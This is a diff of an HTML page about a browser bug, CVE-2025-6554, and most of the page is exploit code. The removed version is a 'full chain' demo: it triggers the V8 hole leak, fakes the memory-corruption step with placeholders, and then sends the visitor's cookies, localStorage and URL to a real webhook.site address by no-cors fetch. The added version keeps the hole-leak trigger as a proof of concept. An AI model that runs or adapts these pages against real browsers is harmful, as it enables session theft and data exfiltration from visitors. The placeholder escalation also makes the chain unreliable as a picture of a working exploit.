@@ -1,120 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CVE-2025-6554 Full Chain Demonstration</title>
+  <title>CVE-2025-6554 Proof of Concept</title>
 </head>
 <body>
-  <h1>Demonstrating Full Exploit Chain for Data Exfiltration</h1>
-  <p>This script demonstrates how CVE-2025-6554 could be escalated to exfiltrate data.</p>
+  <h1>Testing CVE-2025-6554</h1>
+  <p>If the browser is vulnerable, the script will execute.</p>
 
   <script>
-    // The URL of the attacker's server to receive the stolen data.
-    const ATTACKER_SERVER_URL = "https://webhook.site/9be4dbf7-093f-4510-b83c-88a2ed5f8b48";
-
-    // Phase 1, Step 1: Trigger the initial vulnerability to leak the "hole".
-    function triggerVulnerability() {
-      function f() {
-        let x;
-        delete x?.[y]?.a;
-        return y;
-        let y;
-      }
-      try {
-        let hole = f();
-        console.log("[+] Vulnerability triggered. Leaked 'hole' value:", hole);
-        return hole;
-      } catch (e) {
-        console.error("[-] Failed to trigger vulnerability. Browser may be patched.");
-        return null;
-      }
+    // Proof-of-concept code for CVE-2025-6554
+    function f() {
+      let x;
+      delete x?.[y]?.a;
+      return y;
+      let y;
     }
 
-    // Phase 1, Step 2: Escalate the "hole" leak to arbitrary memory read/write.
-    // This is a highly complex, version-specific process. This function is a conceptual placeholder.
-    function getArbitraryReadWrite(leaked_hole) {
-      console.log("[*] Attempting to escalate privileges to arbitrary read/write...");
-
-      // In a real exploit, the leaked "hole" would be used here to create type confusion.
-      // This allows creating two arrays (e.g., one for doubles, one for objects) that
-      // point to the same memory, enabling corruption of an adjacent object's metadata.
-      // [1, 2]
-
-      // This relative OOB access is then used to corrupt an ArrayBuffer's
-      // backing_store pointer, turning it into an absolute read/write primitive.
-      // [5]
+    try {
+      let hole = f();
+      console.log("Vulnerability triggered. Leaked value:", hole);
+      alert("Proof-of-concept executed successfully. The browser may be vulnerable.");
       
-      // The following functions are placeholders for the resulting primitives.
-      const arbitraryRead = (address) => {
-        // Placeholder: In a real exploit, this would use the corrupted ArrayBuffer
-        // to read from the specified memory address.
-        console.log(`[*] Reading memory at address: ${address}`);
-        // This is a simplified example of what might be read.
-        if (address === 'cookie_address') {
-            return document.cookie;
-        }
-        return "dummy_memory_content";
-      };
-
-      const arbitraryWrite = (address, data) => {
-        // Placeholder: In a real exploit, this would write data to the specified address.
-        console.log(`[*] Writing data to address: ${address}`);
-      };
-      
-      console.log("[+] Successfully created arbitrary read/write primitives.");
-      return { arbitraryRead, arbitraryWrite };
+      // The 'hole' variable now holds the leaked internal value.
+      // This can be used to build a more complex exploit.
+      let map = new Map();
+      map.delete(hole);
+    } catch (e) {
+      console.error("Script executed, but an error occurred:", e);
+      alert("Script executed, but an error occurred. The browser may not be vulnerable.");
     }
-
-    // Phase 2 & 3: Find sensitive data and exfiltrate it.
-    async function findAndExfiltrateData(memoryPrimitives) {
-      console.log("[*] Searching for sensitive data in memory...");
-
-      // For demonstration, we will target a known piece of data: the document's cookies.
-      // A real attacker would scan memory for patterns matching tokens, passwords, etc.
-      // [6]
-      const sensitiveData = {
-        url: window.location.href,
-        cookies: document.cookie, // Using document.cookie as a stand-in for memory-scanned data.
-        localStorage: {...localStorage },
-      };
-      
-      console.log("[+] Found sensitive data:", sensitiveData);
-      
-      // Base64 encode the data to ensure it's transmitted correctly.
-      const encodedData = btoa(JSON.stringify(sensitiveData));
-      
-      console.log("[*] Exfiltrating data to attacker's server...");
-
-      try {
-        // Use the fetch API to send the data to the attacker's server.
-        // [7, 8]
-        await fetch(ATTACKER_SERVER_URL, {
-          method: 'POST',
-          mode: 'no-cors', // Use no-cors to prevent the browser from blocking the request.
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ payload: encodedData }),
-        });
-        console.log("[+] Data exfiltration successful.");
-        alert("Exploit chain complete. Data has been exfiltrated.");
-      } catch (error) {
-        console.error("[-] Data exfiltration failed:", error);
-      }
-    }
-
-    // --- Main Exploit Logic ---
-    async function main() {
-      const leaked_hole = triggerVulnerability();
-      if (leaked_hole) {
-        const memoryPrimitives = getArbitraryReadWrite(leaked_hole);
-        if (memoryPrimitives) {
-          await findAndExfiltrateData(memoryPrimitives);
-        }
-      }
-    }
-
-    // Run the exploit.
-    main();
   </script>
 
 </body>
